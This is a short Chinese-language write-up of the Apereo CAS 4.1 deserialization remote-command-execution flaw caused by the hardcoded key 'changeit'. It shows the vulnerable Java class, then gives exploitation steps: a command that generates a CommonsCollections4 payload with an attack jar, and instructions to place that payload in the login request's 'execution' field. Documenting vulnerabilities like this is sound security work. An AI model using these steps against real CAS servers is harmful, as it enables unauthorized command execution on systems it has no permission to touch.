# Apereo CAS 4.1 反序列化命令执行漏洞

Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。



漏洞原理实际上是Webflow中使用了默认密钥`changeit`：

```java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");//固定的
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }
    //...
```

 而java框架中还有一个漏洞原理和这个差不多，好像是shiro中的反序列化漏洞，也是使用了固定的key，造成序列化漏洞。



**exp**

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "命令" > 1.txt
```

然后我们登录CAS并抓包，将Body中的`execution`值替换成上面生成的Payload发送：

之后命令执行成功。

